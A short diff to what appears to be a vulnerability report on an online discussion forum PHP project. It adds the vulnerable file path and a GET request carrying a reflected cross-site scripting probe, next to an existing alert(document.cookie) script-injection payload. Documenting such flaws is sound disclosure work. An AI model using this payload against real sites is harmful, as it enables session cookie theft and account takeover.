@@ -4,9 +4,9 @@ Vul_Author: WangTY-Sama
 
 vendors: https://itsourcecode.com/free-projects/php-project/online-discussion-forum-project-in-php-with-source-code/
 
-Vulnerability File: 
+Vulnerability File: /bcc_forum/members/home.php
 
-Vulnerability location: 
+Vulnerability location: GET /bcc_forum/members/compose_msg.php?id=%22%3E%3CsCrIpT%3Ebygedniyyq%3C%2FScRiPt%3E HTTP/1.1
 
 [+] Payload: "><sCrIpT>alert(document.cookie)</ScRiPt>
 
